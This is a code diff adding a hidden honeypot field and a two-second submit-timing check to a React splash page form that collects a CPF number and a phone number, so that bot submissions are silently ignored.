@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import { useNavigate } from "react-router-dom";
 import { Switch } from "@/components/ui/switch";
 import { useFlow } from "@/contexts/FlowContext";
@@ -34,6 +34,8 @@ const SplashPage = () => {
   const [submitting, setSubmitting] = useState(false);
   const [turnstileConfig, setTurnstileConfig] = useState<TurnstileConfig>({ enabled: false, site_key: "" });
   const [networkError, setNetworkError] = useState(false);
+  const [honeypot, setHoneypot] = useState("");
+  const mountTime = useRef(Date.now());
 
   const segColor = getSegmentColor(data.segment);
   const isOtpEnabled = allSteps.some((s) => s.step_key === "otp" && s.enabled);
@@ -61,6 +63,10 @@ const SplashPage = () => {
 
     // Block submit if Turnstile is active but token not yet generated
     if (turnstileActive && !turnstileToken) return;
+
+    // Honeypot + timing: silently block bots without revealing detection
+    const elapsed = Date.now() - mountTime.current;
+    if (honeypot || elapsed < 2000) return;
 
     updateData({ cpf, phone, rememberAccount: remember });
 
@@ -213,6 +219,18 @@ const SplashPage = () => {
           )}
         </div>
       </div>
+
+      {/* Honeypot — invisible to humans, bots auto-fill it */}
+      <input
+        type="text"
+        name="website"
+        value={honeypot}
+        onChange={(e) => setHoneypot(e.target.value)}
+        tabIndex={-1}
+        autoComplete="off"
+        aria-hidden="true"
+        style={{ position: "absolute", left: "-9999px", opacity: 0, height: 0, width: 0 }}
+      />
 
       {/* Toggle */}
       <div className="relative z-10 flex items-center justify-between mb-8">
